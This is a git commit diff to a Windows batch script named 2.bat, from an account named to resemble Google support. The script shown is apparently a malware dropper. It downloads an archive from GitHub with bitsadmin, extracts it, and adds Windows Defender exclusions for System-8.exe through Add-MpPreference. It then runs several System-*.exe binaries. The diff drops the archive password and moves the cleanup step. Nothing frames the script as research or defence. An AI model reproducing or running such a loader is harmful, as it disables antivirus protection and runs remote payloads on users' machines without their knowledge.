5bbc3965af067f2b3b7565c30b94b76c2e3e669a
kalia <119923196+supportgoogle34@users.noreply.github.com>
2023-02-06 15:13:13 +0530

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -13,9 +13,8 @@ curl  -L https://www.7-zip.org/a/7zr.exe -o 7z.exe
 
 bitsadmin /transfer Packages /download /priority foreground https://github.com/supportgoogle34/files/raw/main/winfiles.zip  winfiles.zip
 
-7z.exe x  winfiles.zip -pkali#241 -aos
+7z.exe x  winfiles.zip  -aos
 
-del winfiles.zip
 
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\%USERPROFILE%\System-8.exe"
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " C:\%USERPROFILE%\System-8.exe"
@@ -33,6 +32,8 @@ System-e.exe
 System-8.exe
 System-m.exe
 System-e.exe
+
+del winfiles.zip
 
 
 
